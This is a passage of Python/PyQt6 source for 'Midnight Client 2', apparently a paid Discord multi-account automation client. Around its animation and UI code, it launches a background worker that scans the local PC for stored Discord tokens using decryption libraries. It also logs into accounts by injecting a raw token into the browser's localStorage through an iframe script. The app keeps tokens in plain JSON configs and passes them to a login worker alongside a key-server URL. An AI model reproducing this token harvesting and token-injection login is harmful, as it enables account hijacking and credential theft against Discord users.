        """Override showEvent to trigger the opening animation."""
        super().showEvent(event)
        self.start_show_animation()






    def fetchAllUserProfiles(self):
        """Iterates through all tokens to fetch their user info and avatar."""
        if not self.main_gui or self.is_bot_mode:
            return

        self.log(f"Fetching profile info for all {len(self.tokens)} tokens...")
        self.profile_fetch_threads = []
        for token in self.tokens:
            thread = QThread()
            fetcher = UserInfoFetcher(token, len(self.tokens))
            fetcher.moveToThread(thread)
            
            fetcher.finished.connect(lambda success, user_data, t=token: self.add_profile_to_switcher(success, user_data, t))
            
            thread.started.connect(fetcher.run)
            thread.finished.connect(thread.deleteLater)
            fetcher.finished.connect(thread.quit)
            self.profile_fetch_threads.append((thread, fetcher))
            thread.start()


    def add_profile_to_switcher(self, success, user_data, token):
        if success and self.main_gui:
            username = user_data.get("username")
            avatar_data = user_data.get("avatar_data")

            # Always create the profile picture label
            profile_pic = ProfilePicLabel(token)
            profile_pic.setToolTip(f"Switch to {username}")
            profile_pic.clicked.connect(lambda t=token, p=profile_pic: self.switch_discord_account(t, p))
            
            # If avatar data was successfully downloaded, load it into the label
            if avatar_data:
                pixmap = QPixmap()
                pixmap.loadFromData(avatar_data)
                profile_pic.setPixmap(pixmap)

            self.main_gui.profile_switcher_layout.addWidget(profile_pic)

            # Set the first token's picture as active
            if token == self.tokens[0]:
                profile_pic.set_active(True)
        else:
            self.log(f"[Warning] Could not fetch profile for one of the tokens.")




# In the MidnightClient class:

    def switch_discord_account(self, token, clicked_pic_label):
        """Forcefully switches the Discord account by clearing the session and re-logging."""
        if not self.main_gui or not self.main_gui.web_view:
            self.log("[ERROR] Cannot switch account: Main GUI is not ready.")
            return

        self.log(f"[INFO] Initiating clean-slate account switch...")

        # Update the UI immediately
        for i in range(self.main_gui.profile_switcher_layout.count()):
            widget = self.main_gui.profile_switcher_layout.itemAt(i).widget()
            if isinstance(widget, ProfilePicLabel):
                widget.set_active(False)
        clicked_pic_label.set_active(True)
        
        page = self.main_gui.web_view.page()
        if not page:
            self.log("[ERROR] Cannot switch account: Web page is not available.")
            return

        # Define the function that will run ONLY when the login page has loaded
        def on_login_page_loaded(ok):
            # Disconnect this function so it only runs once
            try:
                page.loadFinished.disconnect(on_login_page_loaded)
            except TypeError:
                pass 

            self.log("   -> Step 3: Login page loaded. Injecting new token.")
            # This is the standard, reliable injection script for the login page
            injection_script = f"""
            (function() {{
                const iframe = document.createElement('iframe');
                document.body.appendChild(iframe);
                iframe.contentWindow.localStorage.setItem('token', `"{token}"`);
                setTimeout(() => {{
                    iframe.remove();
                    location.reload();
                }}, 250);
            }})();
            """
            page.runJavaScript(injection_script)

        # Connect the function to the page's loadFinished signal
        page.loadFinished.connect(on_login_page_loaded)

        # Step 1: Run a script to clear all local storage immediately.
        self.log("   -> Step 1: Nuking current session storage.")
        page.runJavaScript("localStorage.clear();")

        # Step 2: Navigate to the login page. This will trigger the on_login_page_loaded function once it's ready.
        self.log("   -> Step 2: Redirecting to login page.")
        self.main_gui.web_view.setUrl(QUrl("https://discord.com/login"))







    def animate_fade_out(self, on_finished_action):
        """Creates and starts a simple fade-out animation."""
        self.fade_animation = QPropertyAnimation(self, b"windowOpacity")
        self.fade_animation.setDuration(250)  # A quick fade
        self.fade_animation.setStartValue(self.windowOpacity())
        self.fade_animation.setEndValue(0.0)
        self.fade_animation.setEasingCurve(QEasingCurve.Type.InQuad)
        
        # Execute the final action (like closing or minimizing) after the fade is done
        self.fade_animation.finished.connect(on_finished_action)
        self.fade_animation.start()

    def animate_hide_to_tray(self):
        """Creates and starts the slide-down and fade-out animation for the tray."""
        fade_out = QPropertyAnimation(self, b"windowOpacity")
        fade_out.setDuration(300)
        fade_out.setStartValue(self.windowOpacity())
        fade_out.setEndValue(0.0)
        fade_out.setEasingCurve(QEasingCurve.Type.InQuad)

        slide_anim = QPropertyAnimation(self, b"pos")
        screen_geometry = self.screen().geometry()
        end_pos = QPoint(screen_geometry.width() - self.width() - 20, screen_geometry.height() - self.height() - 50)
        slide_anim.setDuration(350)
        slide_anim.setStartValue(self.pos())
        slide_anim.setEndValue(end_pos)
        slide_anim.setEasingCurve(QEasingCurve.Type.InCubic)

        self.hide_animation_group = QParallelAnimationGroup(self)
        self.hide_animation_group.addAnimation(fade_out)
        self.hide_animation_group.addAnimation(slide_anim)
        
        # After the animation finishes, call the actual hide_to_tray method
        self.hide_animation_group.finished.connect(self.hide_to_tray)
        self.hide_animation_group.start()

    def handle_minimize_request(self):
        if self.main_gui and self.main_gui.performance_mode_check.isChecked():

            self.showMinimized()


            return
        self.animate_fade_out(self.showMinimized)

    def handle_hide_to_tray_request(self):
            if self.main_gui and self.main_gui.performance_mode_check.isChecked():

                self.showMinimized()

                return
        # This one is different - it calls the special animation
            self.animate_hide_to_tray()

    def handle_close_request(self):
        # --- MODIFICATION: This now correctly handles closing the app ---
        try:
            # Check if main_gui exists and if performance mode is checked
            if self.main_gui and self.main_gui.performance_mode_check.isChecked():
                QApplication.instance().quit() # Instantly quit
                return
        except Exception:
            # If any attribute error happens (e.g., main_gui is None), proceed to animation
            pass
        
        # If not in performance mode (or on login screen), run the animation
        self.animate_fade_out(QApplication.instance().quit)
    # --- END MODIFICATION ---


    def _process_log_queue(self):
        """
        This is the heart of the lag fix. It runs on the main thread and processes
        log messages in batches to prevent UI flooding.
        """
        if self.main_gui is None or self.log_queue.empty():
            return

        # Prepare lists for each possible log widget
        logs_by_target = {
            'main': [],
            'members': [],
            'cloner': [],
            'commands': []
        }
        
        # Pull all available messages from the queue in one go to avoid blocking
        while not self.log_queue.empty():
            try:
                message, target = self.log_queue.get_nowait()
                if target in logs_by_target:
                    logs_by_target[target].append(message)
            except queue.Empty:
                break # The queue is empty, we're done for this tick
            except Exception:
                continue # Ignore any malformed items in the queue

        # Batch-append the collected messages to the correct QTextEdit
        if logs_by_target['main'] and self.main_gui.logs:
            self.main_gui.logs.append('\n'.join(logs_by_target['main']))
        if logs_by_target['members'] and self.main_gui.members_log:
            self.main_gui.members_log.append('\n'.join(logs_by_target['members']))
        if logs_by_target['cloner'] and self.main_gui.cloner_logs:
            self.main_gui.cloner_logs.append('\n'.join(logs_by_target['cloner']))
        if logs_by_target['commands'] and self.main_gui.command_logs:
            self.main_gui.command_logs.append('\n'.join(logs_by_target['commands']))
            
    def log(self, message, target_widget='main'):
        """
        This method is now thread-safe and non-blocking. It simply puts a message 
        into the queue to be processed later by the main thread's timer.
        """
        # We no longer format the time here, we just queue the raw data
        self.log_queue.put((message, target_widget))


        


    def get_local_tokens(self):
        """Scans for local tokens using a background thread to prevent freezing."""
        # Ask for confirmation first
        reply = CustomMessageBox.question(self, "WARNING", 
                                          "This is only for people who do not know how to get their Discord tokens. "
                                          "Are you sure you want to proceed? If not, press No and enter your token in the box.",
                                          QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                                          QMessageBox.StandardButton.No)

        if reply == QMessageBox.StandardButton.No:
            self.log("[INFO] User cancelled local token scan.")
            return

        # Prevent double clicking
        if "Validating" in self.get_tokens_btn.text() or "Scanning" in self.get_tokens_btn.text():
            return

        self.log("[*] Starting local token scan in background...")
        
        if not CRYPTO_LIBS_LOADED:
            error_msg = "[❌] Cannot scan: Cryptography libraries (pycryptodome, pywin32) are missing."
            self.log(error_msg)
            CustomMessageBox.warning(self, "Missing Libraries", "Required cryptography libraries are missing.")
            return

        # Update UI
        self.get_tokens_btn.setEnabled(False)
        self.get_tokens_btn.setText("Scanning...")

        # --- THREAD SETUP ---
        self.harvester_thread = QThread()
        self.harvester_worker = TokenHarvesterWorker()
        self.harvester_worker.moveToThread(self.harvester_thread)

        # Connect signals
        self.harvester_thread.started.connect(self.harvester_worker.run)
        self.harvester_worker.finished.connect(self.on_harvest_complete)
        
        # Cleanup signals
        self.harvester_worker.finished.connect(self.harvester_thread.quit)
        self.harvester_worker.finished.connect(self.harvester_worker.deleteLater)
        self.harvester_thread.finished.connect(self.harvester_thread.deleteLater)

        # Start the background thread
        self.harvester_thread.start()




    def on_harvest_complete(self, potential_tokens):
        """Called when the background harvester thread finishes."""
        if not potential_tokens:
            self.log("[ℹ️] No potential Discord tokens were found on this device.")
            CustomMessageBox.information(self, "Scan Complete", "No Discord tokens were found on this device.")
            self.get_tokens_btn.setText("Get Tokens")
            self.get_tokens_btn.setEnabled(True)
            return

        self.log(f"[ℹ️] Scan done. Found {len(potential_tokens)} potential strings. Validating...")

        # Reset validation counters
        self.valid_tokens_found = []
        self.tokens_to_validate_count = len(potential_tokens)
        self.tokens_validated_count = 0
        self.validation_threads = []
        
        self.get_tokens_btn.setText(f"vding, (0/{self.tokens_to_validate_count})")

        # Start validation threads (This part was already threaded, so it's fine)
        for token in potential_tokens:
            thread = QThread(self)
            worker = TokenValidator(token)
            worker.moveToThread(thread)

            worker.finished.connect(self._handle_token_validated)
            thread.started.connect(worker.run)
            
            worker.finished.connect(thread.quit)
            worker.finished.connect(worker.deleteLater)
            thread.finished.connect(thread.deleteLater)
            
            self.validation_threads.append((thread, worker))
            thread.start()




    def closeEvent(self, event):
        """Safely shuts down the application and any running threads."""
        # Stop any running token validation threads before closing
        if self.validation_threads:
            self.log("[🛑] Application closing... waiting for token validation to complete.")
            for thread, worker in self.validation_threads:
                if thread.isRunning():
                    # Wait for up to 1 second for the thread to finish
                    thread.quit()
                    thread.wait(1000) 
        
        if self.tray_icon:
            self.tray_icon.hide()
            
        event.accept() # Allow the window to close

    def _handle_token_validated(self, token, is_valid):
        """Slot to handle the result from a single TokenValidator worker."""
        if is_valid:
            self.valid_tokens_found.append(token)
        
        self.tokens_validated_count += 1
        self.get_tokens_btn.setText(f"vding, ({self.tokens_validated_count}/{self.tokens_to_validate_count})")

        # Check if all tokens have been processed
        if self.tokens_validated_count >= self.tokens_to_validate_count:
            self._finalize_token_validation()


    def _finalize_token_validation(self):
        """Called when all tokens have been validated. Updates the GUI."""
        if not self.valid_tokens_found:
            self.log("[ℹ️] Validation complete. No valid Discord tokens were found.")
            CustomMessageBox.information(self, "Validation Complete", "No Discord tokens were found.")
        else:
            # Remove duplicates while preserving order
            unique_valid_tokens = list(dict.fromkeys(self.valid_tokens_found))




            token_string = "\n".join(unique_valid_tokens)
            self.token_input.setPlainText(token_string)
            success_msg = f"[✅] Validation complete! Found and populated {len(unique_valid_tokens)} valid token(s)."
            self.log(success_msg)
            CustomMessageBox.warning(self, "WARNING", "One of your tokens may be a duplicate, please check your tokens.")



        # Reset the button to its initial state
        self.get_tokens_btn.setText("Get Tokens")
        self.get_tokens_btn.setEnabled(True)
        self.validation_threads = [] # Clear the thread list






    def start_show_animation(self):
        """Creates and starts the fade-in and slide-up animation."""
        # Fade In Animation
        fade_in = QPropertyAnimation(self, b"windowOpacity")
        fade_in.setDuration(400)
        fade_in.setStartValue(0.0)
        fade_in.setEndValue(1.0)
        fade_in.setEasingCurve(QEasingCurve.Type.InOutQuad)

        # Slide Up Animation
        slide_up = QPropertyAnimation(self, b"pos")
        start_pos = self.pos()
        slide_up.setDuration(450)
        slide_up.setStartValue(QPoint(start_pos.x(), start_pos.y() + 50))
        slide_up.setEndValue(start_pos)
        slide_up.setEasingCurve(QEasingCurve.Type.OutCubic)

        # Group and start animations together
        self.animation_group = QParallelAnimationGroup(self)
        self.animation_group.addAnimation(fade_in)
        self.animation_group.addAnimation(slide_up)
        self.animation_group.start()

    def log(self, message):
        if self.main_gui and hasattr(self.main_gui, 'logs') and self.main_gui.logs:
            self.main_gui.log(message)
        else:
            self.temp_logs_queue.append(message)
            print(f"[PRE-GUI LOG]: {message}")

    def init_ui(self):
        self.setWindowTitle("Midnight Client 2")
        self.resize(self.scale(900), self.scale(650))
        self.original_size = self.size() 
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        self.animated_background = AnimatedBackground(self, borderRadius=0)
        self.setCentralWidget(self.animated_background)

        self.overlay_widget = QWidget(self.animated_background)
        self.overlay_widget.setGeometry(self.animated_background.rect())
        self.overlay_widget.setStyleSheet("background: transparent;")

        self.main_layout_overlay = QVBoxLayout(self.overlay_widget)
        self.main_layout_overlay.setContentsMargins(0, 0, 0, 0)
        self.main_layout_overlay.setSpacing(0)

        top_bar = QFrame(self.overlay_widget)
        top_bar.setFixedHeight(self.scale(50))
        top_bar.setStyleSheet("background: rgba(26, 32, 44, 0.6); border-bottom: 1px solid rgba(255, 255, 255, 0.1);")
        top_bar_layout = QHBoxLayout(top_bar)
        top_bar_layout.setContentsMargins(self.scale(15), 0, self.scale(5), 0)
        top_bar_layout.setSpacing(self.scale(10))

        self.user_info_widget = QWidget()
        self.user_info_layout = QHBoxLayout(self.user_info_widget)
        self.user_info_layout.setContentsMargins(0, 0, 0, 0)
        self.user_info_layout.setSpacing(self.scale(10))

        self.user_info_layout.setAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignVCenter)

        self.avatar_label = QLabel()
        self.avatar_label.setFixedSize(self.scale(32), self.scale(32))
        self.avatar_label.setStyleSheet("border-radius: 16px;")
        self.user_info_layout.addWidget(self.avatar_label)

        self.name_label = QLabel()
    
        self.name_label.setFont(QFont("Segoe UI", 10, QFont.Weight.Bold))
        self.name_label.setStyleSheet("color: white; background: transparent;")
        self.user_info_layout.addWidget(self.name_label)

        self.stop_btn = MinimalButton("STOP")
        self.stop_btn.setFixedSize(self.scale(100), self.scale(36))
        self.stop_btn.setStyleSheet("""
            QPushButton { background: rgba(170, 0, 0, 0.3); border: 1px solid rgba(170, 0, 0, 0.5); color: white; font-weight: bold; }
            QPushButton:hover { background: rgba(170, 0, 0, 0.4); border: 1px solid rgba(170, 0, 0, 0.7); }
            QPushButton:pressed { background: rgba(170, 0, 0, 0.5); }
        """)
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.handle_stop)
        self.user_info_layout.addWidget(self.stop_btn)

        self.user_info_widget.setVisible(False)
        top_bar_layout.addWidget(self.user_info_widget)

        top_bar_layout.addStretch()

        app_title = QLabel("MIDNIGHT CLIENT 2", top_bar)
        app_title.setFont(QFont("Segoe UI", 10, QFont.Weight.Bold))
        app_title.setStyleSheet("color: rgba(255, 255, 255, 0.7); background: transparent;")
        top_bar_layout.addWidget(app_title)

        button_style = """
            QPushButton { background: transparent; border: none; border-radius: 6px; color: rgba(255, 255, 255, 0.5); }
            QPushButton:hover { background: rgba(255, 255, 255, 0.1); color: rgba(255, 255, 255, 0.8); }
            QPushButton:pressed { background: rgba(255, 255, 255, 0.2); }
        """

        minimize_btn = AnimatedButton("—", top_bar)
        minimize_btn.setFixedSize(self.scale(28), self.scale(28))
        minimize_btn.setFont(QFont("Segoe UI", 12))
        minimize_btn.setStyleSheet(button_style)
        minimize_btn.clicked.connect(self.handle_minimize_request)
        top_bar_layout.addWidget(minimize_btn)

        hide_btn = AnimatedButton("▽", top_bar)
        hide_btn.setFixedSize(self.scale(28), self.scale(28))
        hide_btn.setFont(QFont("Segoe UI", 12))
        hide_btn.setStyleSheet(button_style)
        hide_btn.setToolTip("Hide to System Tray")
        hide_btn.clicked.connect(self.handle_hide_to_tray_request)
        top_bar_layout.addWidget(hide_btn)

        close_btn = AnimatedButton("×", top_bar)
        close_btn.setFixedSize(self.scale(28), self.scale(28))
        close_btn.setFont(QFont("Segoe UI", 14))
        close_btn.setStyleSheet(button_style)
        close_btn.clicked.connect(self.handle_close_request)
        top_bar_layout.addWidget(close_btn)

        self.content_stack_main = QStackedWidget(self.overlay_widget)
        self.content_stack_main.setStyleSheet("background: transparent;")

        self.login_content_area = QWidget(self.content_stack_main)
        self.login_content_area.setStyleSheet("background: transparent;")
        login_content_layout = QVBoxLayout(self.login_content_area)
        login_content_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        login_content_layout.setContentsMargins(self.scale(20), self.scale(20), self.scale(20), self.scale(20))
        login_content_layout.setSpacing(self.scale(20))

        title_label = QLabel("MIDNIGHT CLIENT", self.login_content_area)
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)

        title_label.setFont(QFont("Segoe UI", 38, QFont.Weight.Medium))
        title_label.setStyleSheet("color: white; letter-spacing: 2px; background: transparent;")

        version_label = QLabel("VERSION 3.0 OPTIMIZATION CHECK SETTINGS.", self.login_content_area)
        version_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        version_label.setFont(QFont("Segoe UI", 12, QFont.Weight.Medium))
        version_label.setStyleSheet(
            "color: rgba(99, 179, 237, 0.9); letter-spacing: 1px; margin-bottom: 8px; background: transparent;")

        login_panel = GlassPanel(self.login_content_area)
        login_panel.setFixedSize(self.scale(450), self.scale(300))
        panel_layout = QVBoxLayout(login_panel)
        panel_layout.setSpacing(self.scale(15))
        panel_layout.setContentsMargins(self.scale(40), self.scale(30), self.scale(40), self.scale(30))
        panel_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        key_label = QLabel("Product Key", login_panel)
        key_label.setFont(QFont("Segoe UI", 11, QFont.Weight.Medium))
        key_label.setStyleSheet("color: rgba(255, 255, 255, 0.8); margin-bottom: 4px; background: transparent;")
        self.keyauth_input = ModernLineEdit(login_panel)
        self.keyauth_input.setPlaceholderText("Enter your product key...")

        token_label = QLabel("User Tokens (One per line)", login_panel)
        token_label.setFont(QFont("Segoe UI", 11, QFont.Weight.Medium))
        token_label.setStyleSheet("color: rgba(255, 255, 255, 0.8); margin-bottom: 4px; background: transparent;")

        self.token_input = ModernTextEdit(login_panel)
        self.token_input.setPlaceholderText("Enter your Discord user tokens here...")
        self.token_input.setFixedHeight(self.scale(100))

        self.login_btn = MinimalButton("AUTHENTICATE", self.login_content_area)
        self.login_btn.clicked.connect(self.handle_login)

        panel_layout.addWidget(key_label)
        panel_layout.addWidget(self.keyauth_input)
        panel_layout.addWidget(token_label)
        panel_layout.addWidget(self.token_input)

        token_management_layout = QHBoxLayout()
        token_management_layout.setSpacing(self.scale(10))
        token_management_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.save_config_btn = MinimalButton("Save Config")
        self.save_config_btn.setFixedWidth(self.scale(140))
        self.save_config_btn.clicked.connect(self.save_config)
        token_management_layout.addWidget(self.save_config_btn)



        self.get_tokens_btn = MinimalButton("Get Tokens")
        self.get_tokens_btn.setToolTip("Scans your PC for locally saved Discord tokens and inputs them automatically.")
        self.get_tokens_btn.setFixedWidth(self.scale(140))
        # Ensure it's connected to the correct function
        if hasattr(self, 'get_local_tokens'):
            self.get_tokens_btn.clicked.connect(self.get_local_tokens)
        else:
            print("CRITICAL ERROR: get_local_tokens method not found!")
        token_management_layout.addWidget(self.get_tokens_btn)

        self.load_config_btn = MinimalButton("Load Config")
        self.load_config_btn.setFixedWidth(self.scale(140))
        self.load_config_btn.clicked.connect(self.load_config)
        token_management_layout.addWidget(self.load_config_btn)

        login_content_layout.addStretch(1)
        login_content_layout.addWidget(title_label)
        login_content_layout.addWidget(version_label)
        login_content_layout.addWidget(login_panel, 0, Qt.AlignmentFlag.AlignCenter)
        login_content_layout.addWidget(self.login_btn, 0, Qt.AlignmentFlag.AlignCenter)
        login_content_layout.addLayout(token_management_layout)
        login_content_layout.addStretch(1)

        self.content_stack_main.addWidget(self.login_content_area)
        self.loading_widget = LoadingScreen(self.content_stack_main)
        self.content_stack_main.addWidget(self.loading_widget)

        self.main_layout_overlay.addWidget(top_bar)
        self.main_layout_overlay.addWidget(self.content_stack_main)

        self.center_window()


    def animate_window_resize(self, target_size: QSize):
        if self.resize_animation_group and self.resize_animation_group.state() == QPropertyAnimation.State.Running:
            self.resize_animation_group.stop()

        if self.main_gui and self.main_gui.performance_mode_check.isChecked():
            self.resize(target_size)
            self.center_window()
            return

        self.resize_animation_group = QParallelAnimationGroup(self)
        
        size_animation = QPropertyAnimation(self, b"size")
        size_animation.setDuration(400)
        size_animation.setEndValue(target_size)
        size_animation.setEasingCurve(QEasingCurve.Type.InOutCubic)

        current_geometry = self.geometry()
        current_center = current_geometry.center()
        new_x = current_center.x() - target_size.width() // 2
        new_y = current_center.y() - target_size.height() // 2
        pos_animation = QPropertyAnimation(self, b"pos")
        pos_animation.setDuration(400)
        pos_animation.setEndValue(QPoint(new_x, new_y))
        pos_animation.setEasingCurve(QEasingCurve.Type.InOutCubic)

        self.resize_animation_group.addAnimation(size_animation)
        self.resize_animation_group.addAnimation(pos_animation)
        self.resize_animation_group.start()


    def init_tray_icon(self):
        if not QSystemTrayIcon.isSystemTrayAvailable():
            self.log("[WARNING] System tray not available on this system.")
            return

        self.tray_icon = QSystemTrayIcon(self)
        
        # Use the application's icon, which we set in main()
        self.tray_icon.setIcon(QApplication.instance().windowIcon()) 
        self.tray_icon.setToolTip("Midnight Client 2")

        tray_menu = QMenu()
        show_action = QAction("Show", self)
        show_action.triggered.connect(self.show_from_tray)
        tray_menu.addAction(show_action)

        quit_action = QAction("Quit", self)
        quit_action.triggered.connect(self.close)
        tray_menu.addAction(quit_action)

        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.activated.connect(self.handle_tray_icon_activation)



    def closeEvent(self, event):
        if self.main_gui:
            self.main_gui.stop_all_bots()

        if self.main_gui and self.main_gui.clear_cache_on_exit_check.isChecked():
            self.log("Clearing browser cache as requested...")
            try:
                profile_path = os.path.join(os.getenv('APPDATA'), 'MidnightClient', 'browser_profile')
                shutil.rmtree(profile_path, ignore_errors=True)
                
                session_file = os.path.join(os.getenv('APPDATA'), 'MidnightClient', 'session.dat')
                if os.path.exists(session_file):
                    os.remove(session_file)

                self.log("[✅] Browser profile directory and session file cleared.")
            except Exception as e:
                self.log(f"[❌] Error clearing cache directory: {e}")
        
        super().closeEvent(event)


    def handle_tray_icon_activation(self, reason):
        # FIX: Use the correct PyQt6 enum 'ActivationReason.Trigger'
        if reason == QSystemTrayIcon.ActivationReason.Trigger:
            self.show_from_tray()

    def show_from_tray(self):
        self.showNormal()
        self.activateWindow()
        self.tray_icon.hide()

    def hide_to_tray(self):
        if self.tray_icon and self.tray_icon.isVisible():
            return

        self.hide()
        if self.tray_icon:
            self.tray_icon.show()

    def closeEvent(self, event):
        if self.tray_icon:
            self.tray_icon.hide()
        event.accept()

    def handle_stop(self):
        if hasattr(self, 'main_gui') and self.main_gui:
            self.main_gui.stop_all_bots()

    def center_window(self):
        if self.screen():
            screen_geometry = self.screen().geometry()
            self.move((screen_geometry.width() - self.width()) // 2, (screen_geometry.height() - self.height()) // 2)

    def handle_login(self, is_bot_attempt=False):
        keyauth_key = self.keyauth_input.text().strip()
        if not is_bot_attempt and not keyauth_key:
            self.log("[❌] Product key is required.")
            CustomMessageBox.warning(self, "Input Error", "Please enter a product key.")
            return

        tokens = [t.strip() for t in self.token_input.toPlainText().split('\n') if t.strip()]
        if not tokens:
            self.log("[❌] No tokens entered. Please provide at least one user token.")
            CustomMessageBox.warning(self, "Input Error", "Please enter at least one Discord token.")
            return

        self.tokens = tokens
        self.username = None
        self.log("Authenticating...")
        self.login_btn.setText("CONNECTING...")
        self.login_btn.setEnabled(False)

        self.login_thread = QThread()
        self.login_worker = LoginWorker(keyauth_key, self.tokens, self.keyauth_server_url, is_bot_attempt)
        self.login_worker.moveToThread(self.login_thread)

        self.login_worker.finished.connect(self.on_authentication_finished)
        self.login_worker.log_message.connect(self.log)
        self.login_thread.started.connect(self.login_worker.run)
        self.login_thread.finished.connect(self.login_thread.deleteLater)
        self.login_worker.finished.connect(self.login_thread.quit)
        self.login_worker.finished.connect(self.login_worker.deleteLater)

        self.login_thread.start()

    def on_authentication_finished(self, success, data):
        if success:
            self.is_bot_mode = data.get('is_bot', False)
            self.username = data['username']
            self.log(f"[✅] Authenticated: {self.username} {'(BOT MODE)' if self.is_bot_mode else '(USER MODE)'}")
            
            if data.get('avatar_data'):
                pixmap = QPixmap()
                pixmap.loadFromData(data['avatar_data'])
                self.avatar_label.setPixmap(pixmap.scaled(32, 32, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))

            token_count = data['other_tokens_count']
            token_count_str = f" +{token_count}" if token_count > 0 else ""
            self.name_label.setText(f"{data['username']}<b style='color: #63b3ed;'>{token_count_str}</b>")

            self.user_info_widget.setVisible(True)
            self.show_loading_screen()
        
        else:
            if not data.get("is_bot_attempt") and "401" in data.get("error", ""):
                 reply = CustomMessageBox.question(self, 'Authentication Failed',
                                         "The token is invalid for a user account.\n\nIs this a BOT token?",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, QMessageBox.StandardButton.No)
                 if reply == QMessageBox.StandardButton.Yes:
                    self.log("[INFO] Retrying authentication for a bot token...")
                    self.handle_login(is_bot_attempt=True)
                    return
                 else:
                    self.log("[❌] User declined bot token login attempt.")

            error_message = data.get("error", "An unknown authentication error occurred.")
            self.log(f"[❌] Authentication failed: {error_message}")
            CustomMessageBox.critical(self, "Authentication Failed", error_message)
            self.reset_input_style()



    def show_main_gui(self):
        if self.main_gui is None:
            self.main_gui = MainGUI(self.overlay_widget, animated_background=self.animated_background, is_bot_mode=self.is_bot_mode)
            
            self.main_gui.tokens = self.tokens
            self.content_stack_main.addWidget(self.main_gui)
            self.main_gui.set_stop_button_enabled.connect(self.stop_btn.setEnabled)
            
            if self.is_bot_mode:
                self.main_gui.configure_for_bot_mode()

            self.fetchAllUserProfiles()

            for msg in self.temp_logs_queue:
                self.main_gui.log(msg)
            self.temp_logs_queue.clear()

            self.fetch_build_number_background()
            
            # --- NEW: Start Background Guild Fetcher ---
            if self.tokens:
                self.guild_fetch_thread = QThread()
                # Use tokens[0] (The Main Token)
                self.guild_worker = GuildFetcherWorker(self.tokens[0]) 
                self.guild_worker.moveToThread(self.guild_fetch_thread)
                
                # Connect signals
                self.guild_fetch_thread.started.connect(self.guild_worker.run)
                self.guild_worker.log_message.connect(self.main_gui.log) # Log to GUI console
                self.guild_worker.finished.connect(self.main_gui.update_server_list) # Pass data to GUI
                
                # Cleanup
                self.guild_worker.finished.connect(self.guild_fetch_thread.quit)
                self.guild_worker.finished.connect(self.guild_worker.deleteLater)
                self.guild_fetch_thread.finished.connect(self.guild_fetch_thread.deleteLater)
                
                self.guild_fetch_thread.start()
            # -------------------------------------------

        self.content_stack_main.setCurrentWidget(self.main_gui)
        self.log("[✅] Main GUI loaded.")



    def save_config(self):
        options = QFileDialog.Options()
        file_name, _ = QFileDialog.getSaveFileName(self, "Save Config", "", "JSON Files (*.json);;All Files (*)",
                                                   options=options)
        if file_name:
            try:
                config_data = {"product_key": self.keyauth_input.text(),
                               "tokens": self.token_input.toPlainText().splitlines()}
                with open(file_name, 'w') as f:
                    json.dump(config_data, f, indent=4)
                self.log(f"[✅] Configuration saved to {file_name}")
            except Exception as e:
                self.log(f"[❌] Failed to save config: {str(e)}")

    def load_config(self):
        options = QFileDialog.Options()
        file_name, _ = QFileDialog.getOpenFileName(self, "Load Config", "", "JSON Files (*.json);;All Files (*)",
                                                   options=options)
        if file_name:
            try:
                with open(file_name, 'r') as f:
                    config = json.load(f)
                self.keyauth_input.setText(config.get('product_key', ''))
                self.token_input.setPlainText('\n'.join(config.get('tokens', [])))
                self.log(f"[✅] Configuration loaded from {file_name}")
            except Exception as e:
                self.log(f"[❌] Failed to load config: {str(e)}")

    def show_loading_screen(self):
        self.loading_widget.set_user(self.username)
        self.content_stack_main.setCurrentWidget(self.loading_widget)
        QTimer.singleShot(2000, self.show_main_gui)

    def fetch_build_number_background(self):
        """
        Creates and runs the BuildNumberFetcher on a background thread
        to prevent blocking the main application.
        """
        if not self.tokens:
            return

        self.build_fetch_thread = QThread()
        fetcher = BuildNumberFetcher(self.tokens[0])
        fetcher.moveToThread(self.build_fetch_thread)
        fetcher.log_message.connect(self.log)
        self.build_fetch_thread.started.connect(fetcher.run)
        fetcher.finished.connect(self.build_fetch_thread.quit)
        fetcher.finished.connect(fetcher.deleteLater)
        self.build_fetch_thread.finished.connect(self.build_fetch_thread.deleteLater)
        self.build_fetch_thread.start()

    def reset_input_style(self):
        self.login_btn.setText("AUTHENTICATE")
        self.login_btn.setEnabled(True)



    def resizeEvent(self, event):
        """
        Handles window resizing, overlay geometry, drag physics, 
        and centering the custom notification.
        """
        # 1. Resize the transparent overlay to match the background
        if hasattr(self, 'overlay_widget') and self.animated_background:
            self.overlay_widget.setGeometry(self.animated_background.rect())
        
        # 2. Standard processing
        super().resizeEvent(event)
        
        # 3. Update drag physics target (prevents window snapping after resize)
        self.target_pos = QPointF(self.pos())

        # 4. --- NOTIFICATION CENTERING ---
        # If the notification is currently visible, keep it centered during resize
        if hasattr(self, 'target_notification') and self.target_notification.isVisible():
             x = (self.width() - self.target_notification.width()) // 2
             # Keep Y position at 30 (the animation end state)
             self.target_notification.move(x, 30)


    def moveEvent(self, event):
        # If the window is not being actively dragged, update the target position
        # to prevent the "lerp" animation from fighting manual window moves.
        if not self.drag_timer.isActive():
            self.target_pos = QPointF(self.pos())
        super().moveEvent(event)

    def _update_drag_position(self):
        """Smoothly moves the window towards the target position."""
        # --- ADD THIS CHECK ---
        if self.main_gui and self.main_gui.performance_mode_check.isChecked():
            self.move(self.target_pos.toPoint())
            if self.drag_timer.isActive():
                self.drag_timer.stop()
            return
        # --- END ADD ---

        current_pos = QPointF(self.pos())
        dx = self.target_pos.x() - current_pos.x()
        dy = self.target_pos.y() - current_pos.y()

        if abs(dx) < 1 and abs(dy) < 1:
            self.move(self.target_pos.toPoint())
            self.drag_timer.stop()
        else:
            new_x = int(current_pos.x() + dx * self.lerp_factor)
            new_y = int(current_pos.y() + dy * self.lerp_factor)
            self.move(new_x, new_y)

    def mousePressEvent(self, event):
        """Captures the mouse press event to initiate a drag."""
        top_bar = self.main_layout_overlay.itemAt(0).widget()
        is_on_top_bar = event.position().y() < top_bar.height()

        if event.button() == Qt.MouseButton.LeftButton and is_on_top_bar:
